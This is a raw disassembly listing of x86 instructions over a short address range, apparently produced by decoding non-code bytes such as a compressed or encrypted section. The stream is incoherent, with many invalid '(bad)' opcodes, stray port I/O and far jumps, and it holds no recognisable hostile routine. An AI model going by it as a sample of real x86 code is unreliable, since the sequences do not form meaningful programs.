  40a489:	test   al,0x9e
  40a48b:	bound  ebx,QWORD PTR [eax]
  40a48d:	inc    eax
  40a48e:	sti    
  40a48f:	mov    ds,WORD PTR [eax+0x7e180f06]
  40a495:	dec    eax
  40a496:	mov    bh,BYTE PTR [ebx]
  40a498:	sub    ebx,esp
  40a49a:	pop    ebx
  40a49b:	sbb    ebx,ecx
  40a49d:	pop    esi
  40a49e:	mov    ss,WORD PTR [eax+0x4c7752bd]
  40a4a4:	loope  0x40a4f8
  40a4a6:	pushf  
  40a4a7:	shl    DWORD PTR [esi],1
  40a4a9:	xchg   edx,eax
  40a4aa:	out    0x54,eax
  40a4ac:	push   eax
  40a4ad:	dec    esi
  40a4ae:	or     al,0x3c
  40a4b0:	or     al,0xb0
  40a4b2:	loope  0x40a497
  40a4b4:	pop    DWORD PTR [ebx+0x7c794dd6]
  40a4ba:	push   edi
  40a4bb:	stos   BYTE PTR es:[edi],al
  40a4bc:	cdq    
  40a4bd:	sub    eax,0x70ea02f9
  40a4c2:	scas   eax,DWORD PTR es:[edi]
  40a4c3:	mov    ebx,0xb1745404
  40a4c8:	jg     0x40a4a8
  40a4ca:	dec    edi
  40a4cb:	jmp    0x1d556454
  40a4d0:	in     al,dx
  40a4d1:	enter  0x3eb0,0xd0
  40a4d5:	rcr    DWORD PTR [edi-0x25],0xb0
  40a4d9:	movaps xmm6,xmm7
  40a4dc:	popa   
  40a4dd:	scas   eax,DWORD PTR es:[edi]
  40a4de:	and    DWORD PTR [edx+0x51ab1847],eax
  40a4e4:	or     BYTE PTR [edi+ebp*4],ch
  40a4e7:	arpl   WORD PTR [esi],ax
  40a4e9:	sub    DWORD PTR [ecx+eiz*4],edi
  40a4ec:	in     al,dx
  40a4ed:	(bad)  
  40a4ee:	xchg   ecx,eax
  40a4ef:	mov    cl,0x60
  40a4f1:	shl    DWORD PTR [ebx+ebx*4],0x3b
  40a4f5:	loop   0x40a48b
  40a4f7:	(bad)  
  40a4f8:	(bad)  
  40a4f9:	popf   
  40a4fa:	xchg   edx,eax
  40a4fb:	mov    ah,0x2a
  40a4fd:	jg     0x40a568
  40a4ff:	mov    dl,0xed
  40a501:	xor    dh,BYTE PTR [edx]
  40a503:	cmp    eax,0x26cbb7be
  40a508:	or     esi,DWORD PTR [edi-0x45de87c0]
  40a50e:	popf   
  40a50f:	loope  0x40a522
  40a511:	mov    ds:0xb2249016,eax
  40a516:	jl     0x40a544
  40a518:	test   DWORD PTR [ebp+0x67],edx
  40a51b:	lods   eax,DWORD PTR ds:[esi]
  40a51c:	das    
  40a51d:	sub    cl,BYTE PTR [ebx-0x457cf992]
  40a523:	out    dx,eax
  40a524:	dec    eax
  40a525:	sub    eax,0xb4f9422c
  40a52a:	aas    
  40a52b:	arpl   ax,di
  40a52d:	out    0x6c,eax
  40a52f:	jmp    0x40a4d5
  40a531:	or     al,BYTE PTR [edx]
  40a533:	into   
  40a534:	shr    BYTE PTR [ebx+0x1d],1
  40a537:	es mov al,0x71
  40a53a:	call   0x56b5:0x1719a4c7
  40a541:	xchg   BYTE PTR [ecx+esi*2+0x1b80ba5a],cl
  40a548:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a549:	xchg   ebp,eax
  40a54a:	mov    BYTE PTR [edi+0x1f0f23f],dl
  40a550:	mov    edi,0xb0ea6076
  40a555:	call   0x19492071
  40a55a:	inc    esi
  40a55b:	or     DWORD PTR [ecx+0x54],esp
  40a55e:	push   edi
  40a55f:	fwait
  40a560:	push   ecx
  40a561:	add    esi,DWORD PTR [edi]
  40a563:	mov    ah,0x13
  40a565:	add    dh,ch
  40a567:	dec    ecx
  40a568:	cwde   
  40a569:	outs   dx,BYTE PTR ds:[esi]
  40a56a:	sbb    BYTE PTR [esp+ebp*8],cl
  40a56d:	shl    DWORD PTR [ebp-0x26],1
  40a570:	pusha  
  40a571:	and    esp,esi
  40a573:	xor    al,0x36
  40a575:	cmp    eax,0x93f32879
  40a57a:	adc    eax,0x9d4c7170
  40a57f:	push   cs
  40a580:	aas    
  40a581:	adc    ebp,0x288693ff
  40a587:	xchg   ecx,eax
  40a588:	dec    esp
  40a589:	mov    eax,ds:0x146fe552
  40a58e:	xchg   esi,eax
  40a58f:	push   ecx
  40a590:	adc    DWORD PTR fs:[edx],ebp
  40a593:	mov    DWORD PTR [ebx],ecx
  40a595:	(bad)  
  40a597:	ja     0x40a5fa
  40a599:	test   al,0x6f
  40a59b:	pop    ebx
  40a59c:	mov    fs,ebp
  40a59e:	push   cs
  40a59f:	sub    DWORD PTR [ecx],eax
  40a5a1:	or     BYTE PTR [ecx],cl
  40a5a3:	xlat   BYTE PTR ds:[ebx]
  40a5a4:	mov    cl,0x88
  40a5a6:	mov    bl,0x21
  40a5a8:	sub    al,0x63
  40a5aa:	pushf  
  40a5ab:	in     al,dx
  40a5ac:	jbe    0x40a5c0
  40a5ae:	xchg   ebp,eax
  40a5af:	cmp    ebx,edi
  40a5b1:	or     al,0x9c
  40a5b3:	out    dx,al
  40a5b4:	in     eax,dx
  40a5b5:	(bad)  
  40a5b7:	fmul   QWORD PTR [edx-0x24f8484f]
  40a5bd:	inc    ebp
  40a5be:	pop    esi
  40a5bf:	jmp    0x1c95:0x63899240
  40a5c6:	sbb    ebx,eax
  40a5c8:	pop    edi
  40a5c9:	int3   
  40a5ca:	leave  
  40a5cb:	loopne 0x40a598
  40a5cd:	inc    ebx
  40a5ce:	mov    eax,0xdebf9953
  40a5d3:	cmp    ebp,0xf5a7811f
  40a5d9:	mov    esp,0x6805317c
  40a5de:	jle    0x40a5ab
  40a5e0:	mov    gs,WORD PTR [esi-0x1f]
  40a5e3:	jns    0x40a601
  40a5e5:	sbb    eax,0x2fba3de4
  40a5ea:	jno    0x40a640
  40a5ec:	loop   0x40a656
  40a5ee:	scas   eax,DWORD PTR es:[edi]
  40a5ef:	loop   0x40a601
  40a5f1:	jno    0x40a661
  40a5f3:	sti    
  40a5f4:	dec    edi
  40a5f5:	mov    edx,0xabad0458
  40a5fa:	loope  0x40a590
  40a5fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a5fd:	jae    0x40a5d7
  40a5ff:	mov    al,0x1b
  40a602:	frstor [ebp+0xa6289fc]
  40a608:	dec    edi
  40a609:	xor    al,0x5f
  40a60b:	adc    ch,bl
  40a60d:	mov    edx,0x9ddb7bec
  40a612:	push   cs
  40a613:	addr16 jbe 0x40a617
  40a616:	daa    
  40a617:	cld    
  40a618:	gs jg  0x40a67f
  40a61b:	stc    
  40a61c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a61d:	call   0x8c8e1a80
  40a622:	jge    0x40a676
  40a624:	addr16 inc esi
  40a626:	sbb    ecx,DWORD PTR ss:[eax]
  40a629:	add    ah,0xa4
  40a62c:	(bad)  
  40a62d:	jp     0x40a61e
  40a62f:	adc    eax,0x92414439
  40a634:	sub    DWORD PTR [edi-0x5f69bc5e],edx
  40a63a:	pop    esi
  40a63b:	scas   al,BYTE PTR es:[edi]
  40a63c:	cmc    
  40a63d:	mov    al,0xe6
  40a63f:	sub    eax,0xe4e1b18c
  40a644:	mov    ecx,0xcc1a0580
  40a649:	cld    
  40a64a:	pop    ecx
  40a64b:	mov    edx,0x39ec8a6f
  40a650:	dec    ebp
  40a651:	repnz add BYTE PTR [edx-0x2c3985e1],ch
  40a658:	test   BYTE PTR [eax],ch
  40a65a:	mov    eax,0xf66648db
  40a65f:	sar    BYTE PTR es:[edx-0x7b],cl
  40a663:	rcl    DWORD PTR [ecx+0x35],0x60
  40a667:	inc    esi
  40a668:	inc    edi
  40a669:	or     ecx,DWORD PTR [ebx+0x2179d78e]
  40a66f:	lea    esi,[ebp+0x59d68a41]
  40a675:	xor    dh,BYTE PTR [edx]
  40a677:	idiv   DWORD PTR [edx-0x72]
  40a67a:	ret    
  40a67b:	les    esp,FWORD PTR [esi+eiz*2-0x30]
  40a67f:	jmp    0x40a677
  40a681:	dec    ebp
  40a682:	ret    
  40a683:	retf   
  40a684:	sub    esp,DWORD PTR [edx+ebx*8]
  40a687:	js     0x40a68a
  40a689:	cmp    al,0x51
  40a68b:	or     eax,0xd14d933d
  40a690:	test   DWORD PTR [edx-0x61],esi
  40a693:	mov    ds:0x3cadced1,eax
  40a698:	iret   
  40a699:	push   cs
  40a69a:	xor    DWORD PTR ds:0xeb3d349,edi
  40a6a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a6a1:	xchg   ebp,eax
  40a6a2:	pop    edx
  40a6a3:	pop    edx
  40a6a4:	mov    esp,ss
  40a6a6:	fild   QWORD PTR [esp+eax*4-0x3fe2f7d]
  40a6ad:	mov    ds:0x4569985c,al
  40a6b2:	bound  edx,QWORD PTR [esi*1-0x6e4c3581]
  40a6b9:	shl    cl,0xd1
  40a6bc:	mov    ch,0xa7
  40a6be:	out    0x37,al
  40a6c0:	pop    ebp
  40a6c1:	dec    ebp
  40a6c2:	push   0xffffff8b
  40a6c4:	inc    ecx
  40a6c5:	out    0x9e,eax
  40a6c7:	out    0x1e,al
  40a6c9:	outs   dx,BYTE PTR ds:[esi]
  40a6ca:	dec    edi
  40a6cb:	call   FWORD PTR [ebx+0x22]
  40a6ce:	push   eax
  40a6cf:	mov    ch,0xe7
  40a6d1:	(bad)  
  40a6d2:	jb     0x40a70b
  40a6d4:	in     eax,0x7a
  40a6d6:	or     BYTE PTR [edx+0x16],0x56
  40a6da:	out    dx,al
  40a6db:	cmp    DWORD PTR [esi+0x47],ebx
  40a6de:	cmp    DWORD PTR [ebp+ebp*1+0x23fb534],ebp
  40a6e5:	out    0xd,al
  40a6e7:	jl     0x40a6df
  40a6e9:	aaa    
  40a6ea:	and    eax,0x2564543d
  40a6ef:	push   eax
  40a6f0:	int3   
  40a6f1:	add    BYTE PTR [edi+0x7d],bh
  40a6f4:	jae    0x40a692
  40a6f6:	push   0x6b
  40a6f8:	or     ch,0xce
  40a6fb:	aad    0xcc
  40a6fd:	call   0x24f8:0x3f67da5d
  40a704:	inc    ebx
  40a705:	xor    DWORD PTR [esi],esi
  40a707:	repnz cmp dh,cl
  40a70a:	adc    ch,dl
  40a70c:	aam    0x17
  40a70e:	lea    eax,[edx+0x5f]
  40a711:	mov    ebp,DWORD PTR [ecx]
  40a713:	bound  edi,QWORD PTR [esi]
  40a715:	(bad)  
  40a716:	iret   
  40a717:	mov    ebx,0xe677462
  40a71c:	gs stc 
  40a71e:	dec    edi
  40a71f:	dec    edi
  40a720:	xchg   esi,eax
  40a721:	jne    0x40a6c6
  40a723:	and    esi,DWORD PTR [eax+0xb]
  40a726:	mov    ebp,0x7ca0d9d
  40a72b:	adc    BYTE PTR [edx+0x7d362882],ch
  40a731:	not    BYTE PTR [eax+0x61]
  40a734:	ror    BYTE PTR [ebp-0x5b],0xdd
  40a738:	vpaddb xmm5,xmm1,xmm1
  40a73c:	xchg   DWORD PTR [edi+esi*4-0x547c5c2],ebp
  40a743:	jne    0x40a6f3
  40a745:	jno    0x40a6d0
  40a747:	popa   
  40a748:	dec    edi
  40a749:	outs   dx,DWORD PTR ds:[esi]
  40a74a:	xchg   BYTE PTR [edi],dh
  40a74c:	sub    BYTE PTR ds:0xe0e88ca3,dh
  40a752:	aaa    
  40a753:	outs   dx,BYTE PTR ds:[esi]
  40a754:	cdq    
  40a755:	out    dx,al
  40a756:	cmp    ah,ch
  40a758:	pop    esp
  40a759:	push   edi
  40a75a:	sti    
  40a75b:	sub    ebp,DWORD PTR [ecx]
  40a75d:	fisubr WORD PTR [edi-0xcc3c2d6]
  40a763:	out    0x4e,eax
  40a765:	fcom   DWORD PTR [ebp-0x6ef13ee2]
  40a76b:	mov    dl,0x25
  40a76d:	xchg   BYTE PTR [ebx+0x629b67b6],bl
  40a773:	xchg   edi,eax
  40a774:	push   ss
  40a775:	fist   DWORD PTR [ebx]
  40a777:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a778:	test   BYTE PTR [edx],dh
  40a77a:	fstp   QWORD PTR [eax+0x7b]
  40a77d:	and    eax,esi
  40a77f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a780:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a781:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a782:	push   ss
  40a783:	(bad)  
  40a784:	imul   eax,edx,0x33
  40a787:	xlat   BYTE PTR ds:[ebx]
  40a788:	cmc    
  40a789:	iret   
  40a78a:	adc    bh,0xee
  40a78d:	mov    BYTE PTR [ebx],ah
  40a78f:	cs push ecx
  40a791:	jno    0x40a7d9
  40a793:	pop    es
  40a794:	(bad)  
  40a795:	cdq    
  40a796:	jnp    0x40a7ad
  40a798:	dec    ebx
  40a799:	mov    esp,0x49ceaa3f
  40a79e:	pop    edi
  40a79f:	aad    0x0
  40a7a1:	retf   
  40a7a2:	mov    ss,WORD PTR [ebx]
  40a7a4:	jmp    0x40a780
  40a7a6:	imul   eax,DWORD PTR [esp+edx*1],0x79
  40a7aa:	push   ebx
  40a7ab:	xor    eax,0x4c14e780
  40a7b0:	aam    0x62
  40a7b2:	fild   DWORD PTR [ecx]
  40a7b4:	mov    ds:0xde4b137d,eax
  40a7b9:	inc    eax
  40a7ba:	push   ds
  40a7bb:	and    dl,BYTE PTR [edi-0x2f]
  40a7be:	retf   0xc8e2
  40a7c1:	inc    edx
  40a7c2:	nop
  40a7c3:	xchg   ebp,eax
  40a7c4:	mov    eax,0xff895f26
  40a7c9:	shl    BYTE PTR [edx+0x643246a3],1
  40a7cf:	pop    edi
  40a7d0:	adc    eax,DWORD PTR [esi-0x1636c560]
  40a7d6:	sahf   
  40a7d7:	mul    DWORD PTR [ebx-0x55]
  40a7da:	cli    
  40a7db:	enter  0xe7c,0x8e
  40a7df:	jge    0x40a7b2
  40a7e1:	add    BYTE PTR [eax-0x63b576c3],cl
  40a7e7:	lock mov ebp,0x926c7940
  40a7ed:	inc    edx
  40a7ee:	xor    BYTE PTR [ebx],dh
  40a7f0:	inc    eax
  40a7f1:	xlat   BYTE PTR ds:[ebx]
  40a7f2:	push   ebx
  40a7f3:	(bad)  
  40a7f4:	lahf   
  40a7f5:	xchg   esi,eax
  40a7f6:	sbb    BYTE PTR [esi+0x25a711d2],cl
  40a7fc:	sbb    BYTE PTR [edi+0x30],bl
  40a7ff:	push   ds
  40a800:	outs   dx,DWORD PTR ds:[esi]
  40a801:	add    ecx,ecx
  40a803:	inc    ebp
  40a804:	dec    edi
  40a805:	enterw 0xfbd,0xb
  40a80a:	mov    al,ds:0xdbf24b6e
  40a80f:	inc    ebx
  40a810:	lea    ebx,[ecx+0x1d]
  40a813:	pop    ds
  40a814:	in     al,dx
  40a815:	push   0x1c
  40a817:	dec    esi
  40a819:	outs   dx,WORD PTR ds:[esi]
  40a81b:	into   
  40a81c:	sbb    BYTE PTR [ebp-0x51eb8f99],al
  40a822:	into   
  40a823:	les    edx,FWORD PTR [esi+eiz*2+0x6a2f2684]
  40a82a:	cmp    edi,edi
  40a82c:	jmp    0x40a7de
  40a82e:	add    DWORD PTR [esi+0x32c7c4b5],eax
  40a834:	inc    ecx
  40a835:	mov    ebx,0xc0f99587
  40a83a:	pop    edx
  40a83b:	and    al,0x8f
  40a83d:	call   0x1363:0xefd15d07
  40a844:	dec    eax
  40a845:	push   esp
  40a846:	inc    eax
  40a847:	sahf   
  40a848:	sahf   
  40a849:	fadd   QWORD PTR [eax+0x2e9699b0]
  40a84f:	loope  0x40a7f4
  40a851:	mov    ch,0xa1
  40a853:	mov    ah,0x94
  40a855:	test   eax,0x9c113f59
  40a85a:	pop    es
  40a85b:	mov    ds:0x43d83838,al
  40a860:	adc    BYTE PTR [eax],dl
  40a862:	sbb    BYTE PTR [esi+0x48],ch
  40a865:	adc    DWORD PTR [ecx],edx
  40a867:	pop    esi
  40a868:	rol    DWORD PTR [ecx],1
  40a86a:	in     al,0x39
  40a86c:	lds    ebp,FWORD PTR [edi+edx*8-0x4d]
  40a870:	dec    ebp
  40a871:	imul   esi,edx,0xb4d59a2e
  40a877:	imul   DWORD PTR [eax-0x20477881]
  40a87d:	push   es
  40a87e:	jle    0x40a851
  40a880:	add    ecx,DWORD PTR [esi+0x11]
  40a883:	int3   
  40a884:	arpl   di,dx
  40a886:	mov    esp,0xea3f455d
  40a88b:	sub    al,0x42
  40a88d:	push   es
  40a88e:	inc    eax
  40a88f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a890:	cmc    
  40a891:	int    0x94
  40a893:	sbb    bh,BYTE PTR [ebp-0x2dcf61bd]
  40a899:	cld    
  40a89a:	and    DWORD PTR [esp+ebp*2+0x7fa20e63],ebp
  40a8a1:	sbb    al,0xf1
  40a8a3:	enter  0x58c0,0xc2
  40a8a7:	outs   dx,BYTE PTR ds:[esi]
  40a8a8:	xchg   edi,eax
  40a8a9:	xchg   ebp,eax
  40a8aa:	pop    ss
  40a8ab:	je     0x40a87b
  40a8ad:	test   DWORD PTR [ebx+eax*8-0x5750b0a],0x6d27e537
  40a8b8:	std    
  40a8b9:	retf   
  40a8ba:	iret   
  40a8bb:	push   ebp
  40a8bc:	test   eax,0xe436c42d
  40a8c1:	cmp    DWORD PTR [ecx],0x8a46b03f
  40a8c7:	sub    esp,DWORD PTR [esi-0xc628f10]
  40a8cd:	jge    0x40a937
  40a8cf:	jbe    0x40a88f
  40a8d1:	sbb    ebp,ebx
  40a8d3:	out    0xbf,al
  40a8d5:	(bad)  
  40a8d6:	aad    0x44
  40a8d8:	sbb    BYTE PTR ds:0x1be9edde,ah
  40a8de:	int3   
  40a8df:	dec    esi
  40a8e0:	retf   
  40a8e1:	add    ebp,DWORD PTR [edi+edi*1+0x5ec960dd]
  40a8e8:	jnp    0x40a891
  40a8ea:	xlat   BYTE PTR ds:[ebx]
  40a8eb:	push   ds
  40a8ec:	dec    ecx
  40a8ed:	push   0x7f
  40a8ef:	stos   DWORD PTR es:[edi],eax
  40a8f0:	mov    gs,WORD PTR [edi-0x42]
  40a8f3:	ds dec ebx
  40a8f5:	push   ebp
  40a8f6:	sbb    al,0x29
  40a8f8:	cmp    ch,BYTE PTR [edi+0x3a]
  40a8fb:	cmp    DWORD PTR [eax+0x7b],esi
  40a8fe:	call   0x9f4d99b1
  40a903:	std    
  40a904:	pop    edx
  40a905:	push   ebx
  40a906:	nop
  40a907:	je     0x40a8b2
  40a909:	push   0x7d
  40a90b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a90c:	inc    edx
  40a90d:	push   ebp
  40a90e:	sar    DWORD PTR [ebx+0x548392ab],1
  40a914:	inc    edi
  40a915:	ja     0x40a8bf
  40a917:	and    al,0xfa
  40a919:	int3   
  40a91a:	punpckhdq mm6,QWORD PTR [ecx]
  40a91d:	push   cs
  40a91e:	xchg   edx,eax
  40a91f:	mov    cs:0xac99693c,al
  40a925:	sbb    ebx,DWORD PTR ds:0x9c0cdfcf
  40a92b:	lock ins BYTE PTR es:[edi],dx
  40a92d:	add    dh,dh
  40a92f:	mov    al,ds:0x4feee31d
  40a934:	mov    al,0x9d
  40a936:	icebp  
  40a937:	cmp    esi,DWORD PTR [ebx]
  40a939:	mov    bh,0xca
  40a93b:	adc    eax,0xd3f2fb34
  40a940:	neg    DWORD PTR [edx+eax*8+0x13b2c141]
  40a947:	sub    edx,DWORD PTR [ebp+esi*4+0x7f801334]
  40a94e:	mov    ch,0xe0
  40a950:	call   0xd1b7:0x4a1fad39
  40a957:	les    esp,FWORD PTR es:[edx+0x54]
  40a95b:	add    edx,DWORD PTR [edx+edx*8+0x10]
  40a95f:	hlt    
  40a960:	shr    BYTE PTR [edi-0x33dc9d3d],cl
  40a966:	fmul   st(3),st
  40a968:	ja     0x40a979
  40a96a:	out    dx,eax
  40a96b:	cmp    eax,0x889a9fb6
  40a970:	jnp    0x40a997
  40a972:	adc    eax,0xa170d50d
  40a977:	sti    
  40a978:	and    DWORD PTR [edx-0x36],ecx
  40a97b:	cmp    al,0x7e
  40a97d:	jecxz  0x40a9f4
  40a97f:	dec    eax
  40a980:	pop    es
  40a981:	push   0x767183f
  40a986:	or     DWORD PTR [edx],edi
  40a988:	xor    dl,bh
  40a98a:	aaa    
  40a98b:	das    
  40a98c:	sub    eax,0x996d65fa
  40a991:	xchg   ebp,eax
  40a992:	or     al,0xb5
  40a994:	and    ebp,DWORD PTR [ebx+0x73d4243a]
  40a99a:	pop    ds
  40a99b:	mov    dl,0x6f
  40a99d:	aad    0x7a
  40a99f:	adc    al,0xf9
  40a9a1:	or     al,0x31
  40a9a3:	aam    0xc0
  40a9a5:	mov    eax,ds:0x98675f62
  40a9aa:	popa   
  40a9ab:	add    edx,0x19
  40a9ae:	xchg   edx,eax
  40a9af:	pop    ebp
  40a9b0:	sub    ecx,ebx
  40a9b2:	mov    ?,WORD PTR [ebp+esi*2-0x23]
  40a9b6:	mov    BYTE PTR [edi-0x2],bh
  40a9b9:	xchg   ebp,eax
  40a9ba:	push   edi
  40a9bb:	sbb    edx,esi
  40a9bd:	lods   eax,DWORD PTR ds:[esi]
  40a9be:	in     eax,dx
  40a9bf:	mov    ebp,0xfd115958
  40a9c4:	fbld   TBYTE PTR [ecx+0x1]
  40a9c7:	mov    edx,DWORD PTR [ecx+eiz*4+0x5185df0a]
  40a9ce:	stc    
  40a9cf:	mov    ch,0x71
  40a9d1:	shr    DWORD PTR [ebx-0x17],0xd4
  40a9d5:	std    
  40a9d6:	jmp    0x40aa1d
  40a9d8:	push   cs
  40a9d9:	outs   dx,DWORD PTR ds:[esi]
  40a9da:	pushf  
  40a9db:	and    bh,al
  40a9dd:	jnp    0x40a9aa
  40a9df:	leave  
  40a9e0:	in     eax,dx
  40a9e1:	les    eax,FWORD PTR [eax]
  40a9e3:	jno    0x40aa27
  40a9e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9e6:	push   edi
  40a9e7:	mov    bl,0xc
  40a9e9:	cdq    
  40a9ea:	out    0x31,al
  40a9ec:	in     eax,dx
  40a9ed:	mov    ds:0x8beb88dd,al
  40a9f2:	je     0x40a9db
  40a9f4:	lea    edi,[eax+0x62]
  40a9f7:	jo     0x40a9a1
  40a9f9:	push   ebp
  40a9fa:	xchg   BYTE PTR [edi+0x23],ch
  40a9fd:	push   ebx
  40a9fe:	pop    edx
  40a9ff:	retf   
  40aa00:	aaa    
  40aa01:	out    0x33,eax
  40aa03:	dec    ebx
  40aa04:	inc    ecx
  40aa05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa06:	xchg   esp,eax
  40aa07:	add    al,0x6
  40aa09:	call   0x3e30a69f
  40aa0e:	das    
  40aa0f:	or     eax,0x8a2708e1
  40aa14:	das    
  40aa15:	loop   0x40aa0b
  40aa17:	and    esp,DWORD PTR [ebx+0x33]
  40aa1a:	cwde   
  40aa1b:	(bad)  
  40aa1c:	aaa    
  40aa1d:	jecxz  0x40aa64
  40aa1f:	mov    dl,0x45
  40aa21:	mov    ebp,0x5e9eb78f
  40aa26:	dec    esp
  40aa27:	in     eax,dx
  40aa28:	scas   eax,DWORD PTR es:[edi]
  40aa29:	daa    
  40aa2a:	cmp    bl,dl
  40aa2c:	gs or  eax,0x55dd0098
  40aa32:	mov    ds:0x2defdf0c,al
  40aa37:	iret   
  40aa38:	and    BYTE PTR [esi],cl
  40aa3a:	test   ebp,edx
  40aa3c:	mov    al,ds:0x11de937c
  40aa41:	mov    ds:0xcc370176,al
  40aa46:	out    dx,eax
  40aa47:	xor    BYTE PTR [esi],bh
  40aa49:	adc    DWORD PTR [ebx+0xc8de8e7],0xe679eb63
  40aa53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa54:	mov    bl,0x2e
  40aa56:	inc    edi
  40aa57:	mov    esi,0xd1a34577
  40aa5c:	scas   al,BYTE PTR es:[edi]
  40aa5d:	mov    esp,0x61522b49
  40aa62:	and    al,0xdb
  40aa64:	lods   eax,DWORD PTR ds:[esi]
  40aa65:	outs   dx,DWORD PTR ds:[esi]
  40aa66:	mov    dh,0xa7
  40aa68:	jg     0x40aa23
  40aa6a:	lods   al,BYTE PTR ds:[esi]
  40aa6b:	xchg   ecx,eax
  40aa6c:	sbb    DWORD PTR [edx+0x75e7d799],ecx
  40aa72:	mov    eax,ds:0xbeed8415
  40aa77:	add    BYTE PTR [ecx],dl
  40aa79:	and    eax,0xa8f12059
  40aa7e:	daa    
  40aa7f:	out    0x19,al
  40aa81:	(bad)  
  40aa82:	sub    eax,0x3e8bd1fe
  40aa87:	push   ss
  40aa88:	mov    dl,0xd
  40aa8a:	cmc    
  40aa8b:	mov    DWORD PTR [ecx],ebp
  40aa8d:	test   al,0x55
  40aa8f:	hlt    
  40aa90:	and    bh,BYTE PTR [ecx]
  40aa92:	push   esi
  40aa93:	shr    BYTE PTR [esi+0xc],1
  40aa96:	sub    DWORD PTR [esi+0x7c3783e6],esi
  40aa9c:	fldcw  WORD PTR [ebx]
  40aa9e:	jno    0x40aa95
  40aaa0:	or     ecx,esp
  40aaa2:	int    0xc3
  40aaa4:	clc    
  40aaa5:	mov    esp,0x6068aa0c
  40aaaa:	sahf   
  40aaab:	rol    DWORD PTR [esi+0x19465cd],0x8e
  40aab2:	test   ah,al
  40aab4:	mov    ss,WORD PTR [edi+0x24aafa79]
  40aaba:	bnd ja 0x40aa9b
  40aabd:	sub    eax,0xed8a784e
  40aac2:	sub    BYTE PTR [ebx],bh
  40aac4:	mov    eax,ds:0xae2e7dac
  40aac9:	dec    eax
  40aaca:	push   edx
  40aacb:	dec    dh
  40aacd:	push   ebp
  40aace:	lds    esp,FWORD PTR [eax-0x7155f1de]
  40aad4:	pop    esp
  40aad5:	adc    esi,DWORD PTR [ebx+0x1089e15a]
  40aadb:	xor    al,0x55
  40aadd:	call   0x7f859deb
  40aae2:	mov    dl,0xa3
  40aae4:	and    DWORD PTR [edi],edx
  40aae6:	hlt    
  40aae7:	dec    ebx
  40aae8:	mov    cl,0xb
  40aaea:	gs cwde 
  40aaec:	cdq    
  40aaed:	sub    dl,BYTE PTR [edi-0x374af11d]
  40aaf3:	adc    BYTE PTR [esp+ebx*8-0x445e6d95],al
  40aafa:	repz xchg edx,eax
  40aafc:	sahf   
  40aafd:	shl    esp,1
  40aaff:	push   ebp
  40ab00:	arpl   WORD PTR [esp+esi*4-0x62968414],si
  40ab07:	xor    al,0x98
  40ab09:	xor    DWORD PTR [eax],0x1939358d
  40ab0f:	pop    esi
  40ab10:	dec    edi
  40ab11:	jbe    0x40ab35
  40ab13:	mov    ah,0x6f
  40ab15:	ins    BYTE PTR es:[edi],dx
  40ab16:	int3   
  40ab17:	pusha  
  40ab18:	sbb    DWORD PTR [ecx-0x395c7c91],ebx
  40ab1e:	xchg   ebx,eax
  40ab1f:	xchg   ebx,eax
  40ab20:	mov    ebx,0x1f0e1fd5
  40ab25:	cld    
  40ab26:	sahf   
  40ab27:	in     eax,dx
  40ab28:	and    BYTE PTR [edx],dh
  40ab2a:	xlat   BYTE PTR ds:[bx]
  40ab2c:	outs   dx,DWORD PTR ds:[esi]
  40ab2d:	out    0xe4,al
  40ab2f:	jecxz  0x40aab3
  40ab31:	add    esi,DWORD PTR [ecx]
  40ab33:	iret   
  40ab34:	ret    
  40ab35:	pop    ecx
  40ab36:	(bad)
  40ab3b:	inc    edi
  40ab3c:	mov    ebp,0xe1b763b3
  40ab41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab42:	outs   dx,BYTE PTR ds:[esi]
  40ab43:	das    
  40ab44:	adc    dh,BYTE PTR [ebx+0x19c42497]
  40ab4a:	retf   
  40ab4b:	(bad)  
  40ab4c:	in     al,dx
  40ab4d:	sub    ebp,DWORD PTR [ecx+0x40]
  40ab50:	adc    al,dl
  40ab52:	mov    ebx,0x28ddd49d
  40ab57:	out    0xf1,eax
  40ab59:	ins    BYTE PTR es:[edi],dx
  40ab5a:	sbb    eax,0xba58ecbc
  40ab5f:	jne    0x40ab4c
  40ab61:	xchg   ebp,eax
  40ab62:	xor    al,0x79
  40ab64:	dec    edx
  40ab65:	sbb    DWORD PTR [esi+edi*2-0x7a309964],ecx
  40ab6c:	cmp    DWORD PTR [edi-0x23],ebx
  40ab6f:	add    DWORD PTR [edi-0x79e4c1c3],esi
  40ab75:	mov    cl,0x9f
  40ab77:	stos   DWORD PTR es:[edi],eax
  40ab78:	jle    0x40ab76
  40ab7a:	push   esi
  40ab7b:	lea    ebp,[esi]
  40ab7d:	lds    edx,FWORD PTR [ecx]
  40ab7f:	(bad)  
  40ab80:	int    0xea
  40ab82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab83:	das    
  40ab84:	mov    edx,ss
  40ab86:	adc    eax,0x4b62dc54
  40ab8b:	les    eax,FWORD PTR [eax+0x71552546]
  40ab91:	mov    bh,0xf
  40ab93:	cmp    eax,0x17bcd02f
  40ab98:	mov    eax,ds:0xec38436e
  40ab9e:	scas   eax,DWORD PTR es:[edi]
  40ab9f:	(bad)  
  40aba1:	sahf   
  40aba2:	xchg   ecx,eax
  40aba3:	cmp    esi,ecx
  40aba5:	pop    esi
  40aba6:	outs   dx,DWORD PTR ds:[esi]
  40aba7:	mov    eax,ds:0xc182f35f
  40abac:	push   cs
  40abad:	fistp  DWORD PTR [eax+0x29]
  40abb0:	ficom  DWORD PTR [ebx+0xe]
  40abb3:	(bad)
  40abb6:	jne    0x40abaf
  40abb8:	dec    ecx
  40abb9:	fldenv [edi-0x2f066538]
  40abbf:	fadd   QWORD PTR [edx-0x42]
  40abc2:	add    ah,cl
  40abc4:	xchg   ebx,eax
  40abc5:	cmp    al,0x5c
